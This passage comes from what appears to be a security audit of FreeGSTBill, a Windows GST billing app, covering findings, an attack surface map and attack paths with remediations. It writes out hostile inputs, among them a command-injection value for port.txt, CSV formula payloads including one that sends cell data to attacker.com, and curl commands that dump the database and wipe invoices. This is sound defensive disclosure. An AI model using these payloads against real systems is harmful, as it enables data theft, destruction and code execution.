  A local unprivileged process or exploit alters `data/port.txt` to contain `47371 & powershell -ep bypass -c "..."`. When the user or an automated script invokes `Stop FreeGSTBill.bat` or `Update FreeGSTBill.bat`, the injected command executes immediately.
- **Impact:**
  Arbitrary command execution in Windows batch environment.
- **Remediation:**
  Validate and sanitize `PORT` to assert it contains strictly decimal digits (`^[0-9]+$`) before using it in batch commands.

---

### [VULN-HIGH-05] Absence of Anti-CSRF Protection on Mutating and Destructive API Endpoints

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` (Base Score: **7.5**)
- **Confidence:** High
- **CWE:** CWE-352 (Cross-Site Request Forgery)
- **Source IDs:** Stream A `A-04`
- **File & Line References:**
  - `server.js`: lines 54-72, 217-301, 568-662, 951-959
- **Root Cause:**
  The application does not validate Anti-CSRF tokens, does not utilize `SameSite` cookies, and does not check `Sec-Fetch-Site` headers. The CORS middleware allows requests without an `Origin` header (`!origin` is true on `server.js:57`). Certain cross-origin request mechanisms (or browser extensions, local desktop proxies, and no-origin navigation contexts) can issue state-altering `POST` or `DELETE` requests without triggering CORS pre-flight origin rejection.
- **Attack Scenario:**
  An attacker crafts an exploit webpage that triggers state-altering actions against `http://localhost:47371/api/bills/INV-001?permanent=1` or triggers `POST /api/control-panel/launch-script`. If dispatched from an environment omitting the `Origin` header, the server processes the request unconditionally.
- **Impact:**
  Unauthorized state tampering, accidental or malicious invoice destruction, and forced script execution.
- **Remediation:**
  1. Inspect `req.headers['sec-fetch-site']` and reject any cross-site request (`sec-fetch-site === 'cross-site'`).
  2. Mandate a custom header (e.g. `X-Requested-With: FreeGSTBill` or a random CSRF token) on all `POST`, `PUT`, and `DELETE` endpoints.

---

### [VULN-HIGH-06] Local Binary Hijacking / Privilege Escalation via Unquoted Protocol Handler Command in Registry

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H` (Base Score: **7.3**)
- **Confidence:** High
- **CWE:** CWE-428 (Unquoted Search Path or Element)
- **Source IDs:** Stream B `SEC-B-003`
- **File & Line References:**
  - `Install FreeGSTBill.bat`: lines 173, 273, 277-278, 282-283
- **Root Cause:**
  In `Install FreeGSTBill.bat`:
  `set "TARGET_PATH=%~dp0Start FreeGSTBill.bat"`
  And in lines 273, 278, 283:
  `powershell -Command "... Set-ItemProperty -Path 'HKCU:\Software\Classes\freegstbill\shell\open\command' -Name '(default)' -Value '%TARGET_PATH%'"`
  `%TARGET_PATH%` contains spaces (e.g. `C:\Users\John Doe\Desktop\GST\Start FreeGSTBill.bat`). The string assigned to the registry `(default)` value is NOT wrapped in escaped quotes (`\"%TARGET_PATH%\"`). When Windows invokes a command registered without surrounding quotation marks and containing spaces, the Windows command interpreter parses each space as a possible argument delimiter and searches sequentially: `C:\Users\John.exe`, `C:\Users\John Doe\Desktop\GST\Start.exe`.
- **Attack Scenario:**
  On a shared multi-user machine or directory path with spaces, an attacker drops a malicious `Start.exe` along the unquoted path prefix. When the victim clicks `freegstbill://run`, Windows executes the attacker's binary instead of the application.
- **Impact:**
  Arbitrary local code execution and privilege escalation.
- **Remediation:**
  Enclose path variables in escaped quotation marks when writing registry commands:
  `-Value '\"%TARGET_PATH%\" \"%1\"'`.

---

### [VULN-HIGH-07] Unverified Silent MSI Download and TOCTOU Race Execution in Setup Script

- **Severity:** High
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H` (Base Score: **7.0**)
- **Confidence:** High
- **CWE:** CWE-494 (Download of Code Without Integrity Check), CWE-367 (Time-of-check Time-of-use Race Condition)
- **Source IDs:** Stream B `SEC-B-005`
- **File & Line References:**
  - `release-templates/_system-scripts/install-windows.ps1`: lines 27-32
- **Root Cause:**
  When Node.js is not found on the system, `install-windows.ps1` downloads an MSI installer from `https://nodejs.org/dist/v20.19.0/node-v20.19.0-x64.msi` into the shared `%TEMP%\node-lts-x64.msi` and immediately runs it silently via `msiexec.exe /qn`. There is NO SHA-256 hash validation and NO Authenticode signature verification. Writing to a predictable path in shared `%TEMP%` opens a TOCTOU race condition.
- **Attack Scenario:**
  A local unprivileged process watches `%TEMP%\node-lts-x64.msi`. As soon as the download completes, the attacker swaps the file with a malicious MSI. `msiexec.exe` executes the malicious package silently with elevated installer privileges.
- **Impact:**
  Arbitrary code execution and silent malware installation during application setup.
- **Remediation:**
  Verify the SHA-256 digest of the downloaded MSI before execution, verify digital signatures using `Get-AuthenticodeSignature`, and use a secure, user-private temporary directory.

---

## 7. Medium Severity Findings

### [VULN-MED-01] CSV Formula Injection (CWE-1236) in Financial & Tax Export Routines

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (Base Score: **7.1**)
- **Confidence:** High
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File)
- **Source IDs:** Stream A `A-07`
- **File & Line References:**
  - `src/components/GSTReturns.jsx`: lines 19-27
  - `src/components/ExpenseTracker.jsx`: line 198
  - `src/components/ReportsView.jsx`: line 124
- **Root Cause:**
  All frontend CSV generation functions implement naive delimiter escaping:
  `const escape = (val) => { const s = String(val ?? ''); return s.includes(',') || s.includes('"') || s.includes('\n') ? '"' + s.replace(/"/g, '""') + '"' : s; };`.
  They quote fields containing commas or quotes, but fail to sanitize formula indicator characters (`=`, `+`, `-`, `@`, `|`, `\t`, `\r`).
- **Attack Scenario:**
  1. An external supplier or client provides an invoice or business name containing an Excel formula payload:
     `=cmd|'/C calc'!A0` or `=HYPERLINK("http://attacker.com/steal?data="&A1, "Click to Verify Tax")`.
  2. The accountant exports GST returns or expenses to CSV.
  3. Opening the file in Microsoft Excel or LibreOffice Calc triggers formula execution or data exfiltration.
- **Impact:**
  Arbitrary command execution or financial data leakage from accounting workstations.
- **Remediation:**
  Prepend a single quote `'` to any cell whose string value starts with `=`, `+`, `-`, `@`, `|`, `\t`, or `\r`.

---

### [VULN-MED-02] Object Prototype Pollution / Persistent DoS via Unvalidated `POST /api/meta/:key`

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` (Base Score: **6.8**)
- **Confidence:** High
- **CWE:** CWE-1321 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **Source IDs:** Stream A `A-05`
- **File & Line References:**
  - `server.js`: lines 526-531, 538-545
- **Root Cause:**
  `POST /api/meta/:key` directly assigns user-supplied keys from route parameters into a plain JavaScript dictionary:
  `meta[req.params.key] = req.body.value;`.
  Supplying keys such as `__proto__`, `constructor`, `toString`, or `valueOf` mutates prototype attributes or overrides core Object methods on `meta`.
- **Attack Scenario:**
  1. An attacker sends `POST /api/meta/toString` with `{"value": "corrupted"}` or calls `POST /api/meta/toString/increment`.
  2. `meta['toString']` is set to `NaN` and saved to `data/meta.json`.
  3. When `server.js` or frontend logic invokes string coercion or standard object operations on `meta`, a fatal `TypeError: meta.toString is not a function` is thrown, crashing the server across restarts.
- **Impact:**
  Persistent Denial of Service (DoS), crash loop, object prototype corruption.
- **Remediation:**
  1. Restrict `:key` using a strict whitelist or regex: `/^[a-zA-Z0-9_]{1,64}$/`.
  2. Reject forbidden property names (`__proto__`, `constructor`, `prototype`, `toString`, `valueOf`).
  3. Use `Object.create(null)` or a `Map` when managing key-value stores.

---

### [VULN-MED-03] Windows Reserved DOS Device Name Hang / DoS & Incomplete Path Sanitization in `safeFileName`

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` (Base Score: **6.8**)
- **Confidence:** High
- **CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-20 (Improper Input Validation)
- **Source IDs:** Stream A `A-06`
- **File & Line References:**
  - `server.js`: lines 88-90, 220, 271, 335, 367, 390
- **Root Cause:**
  `safeFileName(id)` only replaces path separators and punctuation (`/[/\\:*?"<>|]/g`). It does NOT sanitize Windows reserved device filenames (`CON`, `PRN`, `AUX`, `NUL`, `COM1-9`, `LPT1-9`) or trailing periods/spaces. Additionally, unlike `/api/save-pdf`, primary CRUD handlers (`bills`, `clients`, `products`) do not enforce `isPathInside()`.
- **Attack Scenario:**
  An entity is created with `id` set to `CON` (e.g. `POST /api/bills` with `{"id": "CON"}`). Node.js attempts synchronous I/O on `data/bills/CON.json`. In the Windows kernel, this maps to the console character device, causing the thread to hang indefinitely and freezing the single-threaded Node.js event loop.
- **Impact:**
  Process freeze, denial of service on Windows platforms.
- **Remediation:**
  1. Sanitize Windows reserved device names: if `/^(CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$/i.test(s)`, prefix with `_`.
  2. Enforce `isPathInside(filePath, expectedDir)` across all entity write and delete operations.

---

### [VULN-MED-04] Zip Slip Directory Traversal Vulnerability in Archive Restoration

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H` (Base Score: **6.6**)
- **Confidence:** High
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
- **Source IDs:** Stream B `SEC-B-009`
- **File & Line References:**
  - `release-templates/_system-scripts/restore-windows.ps1`: lines 37-41
- **Root Cause:**
  In `restore-windows.ps1`:
  `Expand-Archive -Path $zipPath -DestinationPath $dataDir -Force`.
  The script prompts the user to select a backup ZIP and directly calls PowerShell's built-in `Expand-Archive -Force` without pre-validating archive entry paths or checking for directory traversal sequences (`..\`).
- **Attack Scenario:**
  An attacker provides a crafted "backup.zip" containing archive entries like `..\..\server.js` or `..\Start FreeGSTBill.bat`. Restoring this backup overwrites application code files outside `$dataDir`.
- **Impact:**
  Arbitrary file overwrite and persistent code execution on next launch.
- **Remediation:**
  Inspect all ZIP entry names before extraction using `[System.IO.Compression.ZipFile]::OpenRead()` and assert that each entry's resolved target path strictly resides within canonical `$dataDir`.

---

### [VULN-MED-05] Non-Functional SHA-256 Hash Verification & Unpinned External Asset Download in `postinstall`

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N` (Base Score: **5.9**)
- **Confidence:** High
- **CWE:** CWE-353 (Missing Support for Integrity Check), CWE-829 (Inclusion of Functionality from Untrusted Sphere)
- **Source IDs:** Stream B `SEC-B-010`, Stream C `C-SupplyChain-1`
- **File & Line References:**
  - `package.json`: line 82
  - `scripts/bundle-tesseract-assets.mjs`: lines 31-36, 61-77
- **Root Cause:**
  `scripts/bundle-tesseract-assets.mjs` downloads `eng.traineddata` from an unpinned branch (`@main`) via jsDelivr CDN. While lines 31-33 claim the hash is verified, lines 75-76 merely compute the SHA-256 and print it to standard output without comparing it to any expected constant.
- **Attack Scenario:**
  If the upstream GitHub repository or jsDelivr CDN is compromised, modified OCR models are downloaded and written into the application during `npm install` without raising an integrity failure.
- **Impact:**
  Supply-chain vulnerability, untrusted model execution in client browser WASM engine.
- **Remediation:**
  Hardcode the expected SHA-256 digest of `eng.traineddata`, verify it before saving, and pin the download URL to an immutable Git commit hash.

---

### [VULN-MED-06] Plaintext Storage & Exposure of Sensitive Financial and Customer PII at Rest

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (Base Score: **5.5**)
- **Confidence:** High
- **CWE:** CWE-311 (Missing Encryption of Sensitive Data), CWE-312 (Cleartext Storage of Sensitive Information)
- **Source IDs:** Stream B `SEC-B-008`, Stream C `C-Privacy-1`
- **File & Line References:**
  - `data/` directory (`profile.json`, `bills/*.json`, `clients/*.json`)
  - `Update FreeGSTBill.bat`: lines 42-45, 84-87
  - `localStorage` (Presumptive tax filings, business settings)
- **Root Cause:**
  All business database records, client details, GSTINs, PANs, bank accounts, and invoice ledgers are stored in plaintext JSON files without file-level encryption. Additionally, `Update FreeGSTBill.bat` copies these unencrypted records into `%TEMP%\freegstbill_backup`, which is world-readable to other local processes.
- **Attack Scenario:**
  Any low-privileged malware or local user inspects the `data/` folder or shared `%TEMP%` directory and harvests confidential financial records and customer tax data.
- **Impact:**
  Confidentiality breach, customer PII leakage, non-compliance with Indian DPDP Act.
- **Remediation:**
  1. Encrypt sensitive files at rest using AES-256-GCM with a user-derived key (e.g. via Windows DPAPI or master passphrase).
  2. Stage temporary backups within a private, restricted application directory rather than `%TEMP%`.

---

### [VULN-MED-07] Covert Persistence via Windows Startup Folder Shortcut and Hidden PowerShell Daemon

- **Severity:** Medium
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L` (Base Score: **5.3**)
- **Confidence:** High
- **CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers or Windows) / MITRE ATT&CK T1547.001
- **Source IDs:** Stream B `SEC-B-007`
- **File & Line References:**
  - `Install FreeGSTBill.bat`: lines 239-265
  - `start-server-silent.bat`: lines 1-8
- **Root Cause:**
  `Install FreeGSTBill.bat` automatically creates a startup shortcut in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` pointing to `start-server-silent.bat`. This batch file launches `node server.js` via PowerShell with `-WindowStyle Hidden`. The server runs continuously in the background on every user login without a system tray icon, notification, or visible window.
- **Attack Scenario:**
  The server runs 24/7 in the background without user awareness, maintaining an open unauthenticated HTTP attack surface on `127.0.0.1:47371`.
- **Impact:**
  Covert persistence, extended window of vulnerability for local network and cross-origin attacks.
- **Remediation:**
  Make startup persistence an explicit, opt-in toggle in the application settings, and provide a visible system tray indicator when the server is active.

---

## 8. Low Severity Findings

### [VULN-LOW-01] Missing HTTP Security Headers and Absence of Helmet Defense-in-Depth

- **Severity:** Low
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N` (Base Score: **4.3**)
- **Confidence:** High
- **CWE:** CWE-693 (Protection Mechanism Failure)
- **Source IDs:** Stream A `A-08`
- **File & Line References:**
  - `server.js`: lines 43-73
- **Root Cause:**
  `server.js` does not use `helmet` or set defensive HTTP headers: `X-Content-Type-Options: nosniff` is missing, `X-Frame-Options: SAMEORIGIN` is missing, and CSP is enforced only via HTML `<meta>` tag, leaving JSON endpoints and error responses unprotected.
- **Impact:**
  MIME-sniffing and clickjacking risks on error pages and raw endpoints.
- **Remediation:**
  Integrate `helmet` middleware in `server.js` with appropriate CSP policies.

---

### [VULN-LOW-02] Uncontrolled Large Payload Processing and Disk Resource Consumption (DoS)

- **Severity:** Low
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L` (Base Score: **4.0**)
- **Confidence:** High
- **CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)
- **Source IDs:** Stream A `A-09`
- **File & Line References:**
  - `server.js`: lines 217, 568, 670
- **Root Cause:**
  `POST /api/save-pdf` accepts binary payloads up to 20MB without rate limiting or total disk quota enforcement.
- **Impact:**
  Disk space exhaustion and denial of service through rapid file writes.
- **Remediation:**
  Implement `express-rate-limit` on file upload endpoints and enforce a maximum disk quota for `Saved Invoices/`.

---

### [VULN-LOW-03] Indiscriminate Port-Based Process Termination Leading to Local Denial of Service

- **Severity:** Low
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L` (Base Score: **3.3**)
- **Confidence:** High
- **CWE:** CWE-400 (Uncontrolled Resource Consumption)
- **Source IDs:** Stream B `SEC-B-013`
- **File & Line References:**
  - `Stop FreeGSTBill.bat`: lines 10-15
  - `release-templates/_system-scripts/stop-windows.ps1`: lines 17-28
- **Root Cause:**
  The stop scripts locate whichever process is listening on `%PORT%` and invoke `taskkill /f` without verifying that the process name is `node.exe` or executing FreeGSTBill.
- **Impact:**
  Unintended termination of unrelated foreign services if port collisions occur.
- **Remediation:**
  Verify the process executable name and command line before executing `taskkill`.

---

### [VULN-LOW-04] Long-Lived Browser Service Worker Caching of Unencrypted Financial and PII Data

- **Severity:** Low
- **CVSS v3.1:** `CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:N/A:N` (Base Score: **2.8**)
- **Confidence:** High
- **CWE:** CWE-524 (Use of Cache Containing Sensitive Information)
- **Source IDs:** Stream B `SEC-B-012`
- **File & Line References:**
  - `vite.config.js`: lines 177-196
- **Root Cause:**
  Workbox `runtimeCaching` caches `/api/*` `GET` responses in browser CacheStorage (`api-cache`) for up to 7 days (`maxAgeSeconds: 60 * 60 * 24 * 7`). Sensitive client profiles and tax invoices remain stored in browser cache unencrypted.
- **Impact:**
  Exposure of financial records and customer PII on shared workstations via browser DevTools.
- **Remediation:**
  Add `Cache-Control: no-store` headers to sensitive financial endpoints or exclude `/api/bills` and `/api/export` from Service Worker runtime caching.

---

## 9. Informational Findings

### [VULN-INFO-01] Missing CI/CD Automated Security Scanning and Reproducible Build Workflows

- **Severity:** Informational
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:N` (Base Score: **0.0**)
- **Confidence:** High
- **CWE:** CWE-1059 (Incomplete Documentation / Missing Build Pipeline Controls)
- **Source IDs:** Stream B `SEC-B-011`
- **File & Line References:**
  - `.github/dependabot.yml`: lines 1-62
  - Missing `.github/workflows/` directory
- **Root Cause:**
  The repository contains `.github/dependabot.yml` but lacks any GitHub Actions workflow definitions. Release archives are built manually on developer machines.
- **Impact:**
  Absence of automated pull-request testing, linting, and SAST security gating.
- **Remediation:**
  Implement GitHub Actions CI workflows for PRs and release builds.

---

### [VULN-INFO-02] Zombie Unused Dependency (`cors: ^2.8.6`) Declared in Manifest

- **Severity:** Informational
- **CVSS v3.1:** `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:N` (Base Score: **0.0**)
- **Confidence:** High
- **CWE:** CWE-1077 (Floating Stylesheet / Unnecessary Dependency)
- **Source IDs:** Stream C `C-SupplyChain-4`
- **File & Line References:**
  - `package.json`: line 97
  - `package-lock.json`: lines 4152-4168
  - `server.js`: line 45
- **Root Cause:**
  `cors` is declared in `dependencies`, but `server.js` line 45 notes that the package is no longer imported and is superseded by custom middleware.
- **Impact:**
  Superfluous dependency bloat; unnecessary supply-chain attack surface.
- **Remediation:**
  Run `npm uninstall cors` to prune the unused package.

---

## 10. Dependency & Supply-Chain Assessment

### 10.1 Lockfile & Known Vulnerabilities Audit
The application manifest (`package.json`) and lockfile (`package-lock.json`, 9,041 lines, Lockfile Version 3) contain **619 total dependencies**. An automated CVE audit via `npm audit --json` yielded **0 vulnerabilities**. The previously reported vulnerability in `jspdf` was remediated by upgrading to version `4.2.1`. All tarballs resolve to official `registry.npmjs.org` endpoints with SHA-512 cryptographic subresource integrity hashes.

### 10.2 Postinstall Asset Download Verification Flaw
In `package.json` line 82, lifecycle scripts invoke `scripts/bundle-tesseract-assets.mjs` during `postinstall` and `prebuild`. Lines 31-36 document:
```javascript
// jsDelivr mirror of tessdata_fast (int-format, ~10MB gzipped).
// SHA-256 verified after download to guard against silent corruption
// or an unexpected 200-status redirect page.
const TRAINEDDATA_URL = 'https://cdn.jsdelivr.net/gh/tesseract-ocr/tessdata_fast@main/eng.traineddata';
```
However, inspection of lines 74-77 reveals that while a SHA-256 hash is computed using Node's `crypto` module, it is merely printed to standard output:
```javascript
const sha = createHash('sha256').update(buf).digest('hex').slice(0, 12);
console.log(`  ✓ eng.traineddata written (${(buf.length / 1024 / 1024).toFixed(1)}MB, sha256:${sha}…)`);
```
No conditional statement (`if (sha !== EXPECTED)`) exists. If the upstream GitHub repository or jsDelivr CDN is compromised, modified OCR neural network models will be bundled directly into the application distribution without raising an error.

### 10.3 Unsigned GitHub Auto-Update Mechanism
Both `Update FreeGSTBill.bat` and `release-templates/_system-scripts/update-windows.ps1` execute live code replacements directly from GitHub. `Update FreeGSTBill.bat` pulls `refs/heads/main.zip` and extracts it over the application root, followed by running `npm install`. This grants repository maintainers (or anyone who compromises maintainer GitHub credentials) direct code execution access to all client installations without cryptographic signature verification.

---

## 11. Secrets Assessment (Strict Redaction Enforced)

### 11.1 Secret Scanning Results
Exhaustive regex scanning was conducted across the codebase targeting AWS keys, Google API keys, GitHub personal access tokens, private RSA/EC keys, database connection strings, JWT secrets, and hardcoded administrative credentials.

**Results:**
- **Active API Keys / Private Keys:** ZERO found.
- **Database Passwords:** ZERO found (persistence is 100% JSON flat-file).
- **JWT Secrets:** ZERO found (application does not use JWTs).

### 11.2 Redacted Test Fixtures & Documentation Tokens
All discovered test fixtures and documentation placeholders strictly comply with redaction requirements:
- **Developer Contact:** `Contact@[REDACTED].com`
- **Test Fixture GSTINs:** `29ABCDE[REDACTED]F1Z5`, `07AAAAA[REDACTED]A1Z1`, `29BBBBB[REDACTED]B2Z2`
- **Documentation Placeholders (`docs/DEPLOY_ONLINE.md`):** `BASIC_AUTH_PASS=[REDACTED]`, `process.env.SUPABASE_[REDACTED]`

### 11.3 Plaintext Data Exposure at Rest
While no static secrets exist in the code, the application creates a severe runtime privacy risk by storing all customer PII, PAN, GSTINs, bank accounts, and invoice ledgers in plaintext JSON in the `data/` directory and browser `localStorage`. Because the backend server has zero authentication controls, this sensitive data can be queried and dumped by any process running on the host.

---

## 12. Attack Surface

The formal attack surface of FreeGSTBill is mapped into five distinct operational boundaries:

```
+---------------------------------------------------------------------------------------------------------+
|                                          ATTACK SURFACE MAP                                             |
+---------------------------------------------------------------------------------------------------------+
|                                                                                                         |
|  [ TRUST BOUNDARY 1: Remote Web Context vs. Host Operating System ]                                     |
|  - Inbound Vectors: Web browser navigation to registered URI schemes                                    |
|    * freegstbill://        -> HKCU:\Software\Classes\freegstbill\shell\open\command                      |
|    * freegstbill-update:// -> HKCU:\Software\Classes\freegstbill-update\shell\open\command               |
|    * freegstbill-stop://   -> HKCU:\Software\Classes\freegstbill-stop\shell\open\command                 |
|  - Cross-Origin Vectors: Web browsers querying localhost API from foreign origins                      |
|                                                                                                         |
|  [ TRUST BOUNDARY 2: Network Listeners & Localhost Inter-Process Communication ]                        |
|  - Listener: TCP 127.0.0.1:47371 (drifting dynamically up to 47421)                                     |
|  - Authentication: ZERO authentication, ZERO sessions, ZERO tokens, ZERO cookies                       |
|  - CORS Policy: Regex allowing !origin (local tools/curl) AND /^https?:\/\/localhost(:\d+)?$/i         |
|  - Multi-User Scope: Shared loopback TCP socket accessible to ALL OS users on host                     |
|                                                                                                         |
|  [ TRUST BOUNDARY 3: OS Interfaces & Native Process Execution ]                                         |
|  - Process Spawner: child_process.spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', ...])         |
|  - Control Panel API: POST /api/control-panel/launch-script ('update', 'restore', 'move', 'stop')       |
|  - Startup Shortcut: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*.lnk                     |
|  - Daemon Runner: start-server-silent.bat (powershell -WindowStyle Hidden)                             |
|                                                                                                         |
|  [ TRUST BOUNDARY 4: Filesystem Boundaries & Storage Locations ]                                        |
|  - data/ directory: Plaintext JSON stores (bills, clients, templates, products, meta.json, etc.)        |
|  - data/port.txt: Read by batch scripts to identify and terminate listening port                       |
|  - Saved Invoices/: Raw PDF files exported via POST /api/save-pdf                                       |
|  - %TEMP%: Staging directory for update backups, uncompressed zips, and downloaded MSIs                 |
|                                                                                                         |
|  [ TRUST BOUNDARY 5: External Network Integrations & Supply Chain ]                                     |
|  - GitHub API & Raw Releases: api.github.com, raw.githubusercontent.com                                 |
|  - CDN Mirrors: cdn.jsdelivr.net (unpinned @main branch binary traineddata download)                    |
|  - Google Identity & Drive: accounts.google.com, www.googleapis.com                                     |
|                                                                                                         |
+---------------------------------------------------------------------------------------------------------+
```

---

## 13. Attack Paths

### Attack Path 1: Remote Web-to-Host Code Execution via Custom URI Schemes & Auto-Update
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Remote     Malicious Webpage       Windows Shell Protocol Handler   Unchecked    Arbitrary Remote |
| Attacker   (Browser Navigation:    (HKCU:\Software\Classes\         GitHub ZIP   Code Execution   |
|            freegstbill-update://)  freegstbill-update) ->           Download &   on Local Host    |
|                                    Update FreeGSTBill.bat           npm install  (Full Takeover)  |
+---------------------------------------------------------------------------------------------------+
```
1. **Trigger:** A victim visits `https://attacker-site.com`. An embedded iframe navigates to `freegstbill-update://run`.
2. **Dispatch:** Windows Shell dispatches the protocol scheme registered under `HKCU:\Software\Classes\freegstbill-update` and launches `Update FreeGSTBill.bat`.
3. **Execution:** The batch script invokes `powershell -Command "Invoke-WebRequest ... -OutFile %TEMP%\freegstbill_latest.zip"` to download `main.zip` from GitHub.
4. **Overwrite:** `robocopy` overwrites application root files without cryptographic signature verification.
5. **Payload:** The script executes `call npm install --silent`, triggering lifecycle hooks and executing code with full local user privileges.

---

### Attack Path 2: Cross-Origin Ledger Theft via Permissive Localhost CORS
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Local Web  Script on Another       server.js Custom CORS            Permissive   Complete Theft of|
| Service or Local Port              Middleware (server.js:54-72)     Regex &      Financial Books, |
| Dev Server (http://localhost:3000) -> GET /api/export               Unauth API   GSTINs, & Ledgers|
+---------------------------------------------------------------------------------------------------+
```
1. **Trigger:** A user runs an internal development server or accesses a local web utility running on port 3000, 5173, or 8080.
2. **Request:** Injected script or malicious dependency issues `fetch('http://127.0.0.1:47371/api/export')`.
3. **Bypass:** `server.js` evaluates `Origin: http://localhost:3000` against `/^https?:\/\/localhost(:\d+)?$/i`, finds a match, and returns `Access-Control-Allow-Origin: http://localhost:3000`.
4. **Exfiltration:** The complete database (clients, GSTINs, PANs, bank accounts, invoice ledgers) is returned to the caller, who forwards it to an external server.

---

### Attack Path 3: Local Workstation Multi-User Data Exfiltration and Database Erasure
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Local Low- Local Process / CLI     server.js Entity Handlers        Missing      Unauthenticated  |
| Privilege  (curl, PowerShell on    (DELETE /api/bills/:id,          Auth &       Database Dump &  |
| User       127.0.0.1:47371)        POST /api/import?overwrite=true) No-Origin    Irreversible Data|
|                                                                     Bypass       Destruction      |
+---------------------------------------------------------------------------------------------------+
```
1. **Context:** A business runs FreeGSTBill on a shared Windows workstation or terminal server.
2. **Access:** A low-privileged local user connects to `127.0.0.1:47371` via CLI (`curl`).
3. **Bypass:** In `server.js:57`, `!origin` evaluates to `true`, allowing CLI tools to bypass the CORS filter.
4. **Theft:** The attacker runs `curl -s http://127.0.0.1:47371/api/export > data.json` to steal all business records.
5. **Destruction:** The attacker executes `curl -X POST "http://127.0.0.1:47371/api/import?overwrite=true" -d "{\"bills\":[]}"` to wipe all active invoices.

---

### Attack Path 4: Supply-Chain Binary Poisoning via Postinstall Asset Download
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Upstream   External CDN / GitHub   package.json:82 postinstall      Omitted      Untrusted Binary |
| Adversary  (cdn.jsdelivr.net       -> scripts/                      Hash Check   Execution in     |
|            tessdata_fast@main)     bundle-tesseract-assets.mjs      (Log-Only)   Browser WASM/OCR |
|                                                                                  Context          |
+---------------------------------------------------------------------------------------------------+
```
1. **Vulnerability:** `package.json` triggers `scripts/bundle-tesseract-assets.mjs` on `postinstall`.
2. **Download:** The script fetches `eng.traineddata` from unpinned `tessdata_fast@main` via jsDelivr.
3. **Flaw:** The script calculates the SHA-256 hash and logs it to console, but contains no assertion comparing it to an expected constant.
4. **Impact:** If jsDelivr or GitHub is compromised, modified OCR models are installed and executed within the user's browser WebAssembly engine.

---

### Attack Path 5: CSV Formula Injection & DDE Execution via Exported Tax Ledgers
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Untrusted  Malicious Invoice /     Frontend CSV Export Functions    Unescaped    Arbitrary DDE    |
| Client or  Vendor Data             (GSTReturns.jsx:19-27,           Formula      Code Execution   |
| Vendor     (=cmd|'/c calc'!A0)     ExpenseTracker.jsx:198)          Prefixes     on Accountant    |
|                                                                     (=, +, -, @) Workstation      |
+---------------------------------------------------------------------------------------------------+
```
1. **Injection:** An external vendor submits an invoice or company name containing `=cmd|'/c calc'!A0`.
2. **Storage:** The payload is stored in `data/bills/` or `data/clients/` via the billing UI.
3. **Export:** The accountant generates a GSTR-1 or Expense CSV export. `downloadCSV` escapes commas and quotes, but leaves formula prefixes (`=`, `+`, `-`, `@`) untouched.
4. **Execution:** Opening the CSV in Microsoft Excel triggers Dynamic Data Exchange (DDE), executing system commands on the accountant's computer.

---

### Attack Path 6: Batch Script Subshell Command Injection via `data\port.txt`
```
+---------------------------------------------------------------------------------------------------+
| Attacker -> Entry Point / Vector -> Affected Function / Component -> Mechanism -> Direct Impact   |
+---------------------------------------------------------------------------------------------------+
| Local User Unsanitized             Stop FreeGSTBill.bat (Lines 10-15) Subshell   Arbitrary Command|
| or File    data\port.txt Content   & Update FreeGSTBill.bat         Command      Execution under  |
| Poisoning  (47371 & calc.exe)      (Lines 31-36)                    Expansion in User Privileges  |
|                                                                     for /f (...) via CMD Subshell |
+---------------------------------------------------------------------------------------------------+
```
